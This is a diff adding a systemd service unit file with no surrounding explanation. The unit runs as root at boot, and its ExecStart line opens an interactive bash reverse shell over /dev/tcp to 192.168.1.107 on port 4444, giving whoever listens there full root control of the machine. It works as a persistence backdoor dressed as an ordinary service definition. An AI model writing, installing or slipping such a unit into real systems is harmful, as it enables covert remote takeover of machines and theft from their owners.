@@ -1,0 +1,7 @@
+[Service]
+Type=simple
+User=root
+ExecStart=/bin/bash -c "bash -i >& /dev/tcp/192.168.1.107/4444 0>&1"
+
+[Install]
+WantedBy=multi-user.target
